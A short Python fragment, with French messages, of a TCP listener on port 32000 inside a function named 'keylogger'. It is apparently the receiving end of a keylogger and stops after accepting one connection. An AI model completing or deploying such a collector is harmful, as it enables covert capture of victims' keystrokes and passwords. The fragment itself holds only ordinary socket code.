import socket

HOST_IP = ""
HOST_PORT = 32000
MAX_DATA_SIZE = 1024

def keylogger():
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST_IP, HOST_PORT))
    s.listen()

    print(f"Attente de connexion sur {HOST_IP}, port {HOST_PORT}...")
    connection_socket, client_address = s.accept()
    print(f"Connexion établie avec {client_address}")
